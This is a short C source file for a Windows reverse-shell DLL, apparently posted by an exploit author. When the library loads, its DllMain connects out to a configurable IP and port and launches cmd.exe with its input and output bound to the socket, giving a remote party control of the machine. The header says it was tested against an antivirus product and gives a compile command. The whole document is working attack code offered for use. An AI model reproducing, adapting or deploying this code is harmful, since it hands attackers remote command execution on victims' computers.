/* Windows Reverse Shell                           
Tested under windows 7 with AVG Free Edition.
Author: FuRt3x
blkhtc0rp@yahoo.com.br                                  
Compile: wine gcc.exe windows.c -o windows.exe -lws2_32 
*/                                                      

#define REVERSEIP "127.0.0.1"
#define REVERSEPORT 5151

#include <winsock2.h>
#include <stdio.h>   

#pragma comment(lib,"ws2_32")

  WSADATA wsaData;
  SOCKET Winsock; 
  SOCKET Sock;    
  struct sockaddr_in hax;
                         
  STARTUPINFO ini_processo;
  PROCESS_INFORMATION processo_info;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{                               
    WSAStartup(MAKEWORD(2,2), &wsaData);
    Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);
                                                                                                                                                                                                   
    hax.sin_family = AF_INET;                                                                     
    hax.sin_port =  htons(REVERSEPORT);
    hax.sin_addr.s_addr = inet_addr(REVERSEIP);                                                     

    WSAConnect(Winsock,(SOCKADDR*)&hax,sizeof(hax),NULL,NULL,NULL,NULL);

    memset(&ini_processo,0,sizeof(ini_processo));
    ini_processo.cb=sizeof(ini_processo);        
    ini_processo.dwFlags=STARTF_USESTDHANDLES;   
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
                                                                                                
    CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,0,NULL,NULL,&ini_processo,&processo_info);      
    return TRUE;
}
